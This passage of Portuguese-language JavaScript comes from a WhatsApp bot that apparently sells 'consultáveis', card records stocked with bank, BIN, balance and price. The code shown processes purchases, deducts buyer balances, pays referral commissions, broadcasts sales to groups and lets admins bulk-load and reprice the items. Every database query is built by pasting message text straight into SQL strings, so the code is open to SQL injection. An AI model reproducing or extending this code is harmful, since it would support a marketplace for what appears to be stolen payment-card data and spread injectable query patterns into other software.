            NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_MATERIAL)
            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            await DataBase_Better.prepare(`INSERT INTO CONSULTAVEIS_VENDIDAS (BANCO,SALDO,PRECO,INFORMACOES_ADICIONAIS,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${BANCO}','${SALDO}','${PRECO}','${INFORMACOES_ADICIONAIS}','${Mensagem_From}','${Date.now()}')`).run()
            await DataBase_Better.prepare(`DELETE FROM CONSULTAVEIS WHERE _rowid_ = ${ID}`).run()

            MENSAGEM_AO_COMPRAR_CONSULTAVEL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CONSULTAVEL'`).get()["VALOR"]

            VALOR_BASE_INDIC = PRECO_MATERIAL
            Contato_Temp_Indic = Mensagem_From
            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                if (ATIVAR_ASSOCIADOS === "1") {

                    Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                    if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                        NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
                        PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        } else {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                        }

                        PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                        if (PIX_OU_COMPRA === "1") {

                        } else if (PIX_OU_COMPRA === "2") {
                            VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                            VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                            console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                            console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                            NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                            NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                            console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                            console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                        }
                    }
                }
            }

            Texto_Usuario = `💳 *CONSULTÁVEL COMPRADA* 💳

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
💰 *VALOR CONSULTÁVEL:* R$: ${PRECO_MATERIAL}

${INFORMACOES_ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_CONSULTAVEL}`

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Consultavel_PV}',
'${Date.now()}')`).run()

            Texto_Grupo = `💳 *USUÁRIO COMPROU UMA CONSULTÁVEL* 💳

👤 *USUÁRIO:* wa.me/${Numero}

💰 *SALDO DISPONÍVEL NA CONSUL:* R$: ${SALDO}
💰 *PREÇO DA CONSULTÁVEL:* R$: ${PRECO_MATERIAL}

*VENHA ADQUIRIR AS MELHORES CONSULTÁVEIS DO MERCADO!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`

            NOT_COMPROU_CONSULTAVEL = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CONSULTAVEL'`).get()["VALOR"]
            if (NOT_COMPROU_CONSULTAVEL === "1") {
                for await (Grupo of ID_GRUPOS) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Consultavel_GP}',
'${Date.now()}')`).run()
                }
            }

            Texto_Adms = `💳 *CONSULTÁVEL COMPRADA* 💳

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
💰 *VALOR CONSULTÁVEL:* R$: ${PRECO_MATERIAL}
💰 *PREÇO DA CONSULTÁVEL:* R$: ${PRECO_MATERIAL}

${INFORMACOES_ADICIONAIS}`

            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }
            console.log(`Consultável Comprada! Numero: wa.me/${Numero} | Valor: ${PRECO_MATERIAL}`)
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 



        //addconsultada===BANCO===BIN===SALDO===PREÇO===INFORMACOES_ADICIONAIS
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addconsultada===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg_text = Mensagem_Texto.replace(/\'/igm, "")
            msg = msg_text.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }


            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO CONSULTADA..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = msg_text.split("/addconsultada===")
                Linhas.splice(0, 1);
                try {
                    Contagem_Abastecidas = 0

                    db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                    db.serialize(async function () {
                        db.run("begin transaction");

                        for (var index = 0; index < Linhas.length; index++) {
                            Abastecendo = true

                            try {

                                Div = Linhas[index].split("===")

                                console.log(`Inserindo: ${Div[1]}`)

                                BANCO = Div[0].toUpperCase()
                                BIN = Div[1]
                                SALDO = Div[2]
                                SALDO = parseFloat(SALDO).toFixed(2)
                                PRECO = Div[3]
                                PRECO = parseFloat(PRECO).toFixed(2)
                                INFORMACOES_ADICIONAIS = Div[4]
                                DATA_MS_INSERIDO = Date.now()

                                db.run(`INSERT INTO CONSULTADAS (BANCO,BIN,SALDO,PRECO,INFORMACOES_ADICIONAIS,DATA_MS_INSERIDO) VALUES ('${BANCO}','${BIN}','${SALDO}','${PRECO}','${INFORMACOES_ADICIONAIS}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1

                            } catch (error) {
                                console.log(error)

                                Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas}.

Erro: ${error}`
                                for await (adm of Adms) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                                }
                                Abastecendo = false
                                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            }
                        }

                        if (Contagem_Abastecidas != 0) {
                            console.log("comitando")
                            db.run("commit");
                        }

                        Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} Consultadas Colocados para abastecimento.

${Contagem_Abastecidas} Consultadas Abastecidas.`
                        for await (adm of Adms) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        }
                        Abastecendo = false
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    });
                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/valorconsultada===") > -1 && Adms.includes(Numero)) {
            try {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                if (Array_Total_Igual.length != 6) {
                    Texto = `Comando inválido CODE:1`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                msg = Mensagem_Texto.split("===")
                ID = msg[1]
                NOVO_VALOR = msg[2]
                NOVO_VALOR = parseFloat(NOVO_VALOR).toFixed(2);

                if (ID === "") {
                    Texto = `Comando inválido CODE:2`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                if (NOVO_VALOR === "") {

                    Texto = `Comando inválido CODE:3`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                SALDO = await DataBase_Better.prepare(`SELECT SALDO FROM CONSULTADAS WHERE _rowid_ = '${ID}'`).get()["SALDO"]

                PRECO_ANTERIOR = await DataBase_Better.prepare(`SELECT PRECO FROM CONSULTADAS WHERE _rowid_ = '${ID}'`).get()["PRECO"]
                PRECO_ANTERIOR = parseFloat(PRECO_ANTERIOR).toFixed(2);

                await DataBase_Better.prepare(`UPDATE CONSULTADAS SET PRECO = '${NOVO_VALOR}' WHERE _rowid_ = '${ID}'`).run()

                Texto = `*Preço da Consultada que possui o Saldo: ${SALDO} do ID: ${ID} alterado com sucesso!*

*Valor anterior:* ${PRECO_ANTERIOR}

*Valor atual:* ${NOVO_VALOR}`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {

                Texto = `Comando inválido! CODE:${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
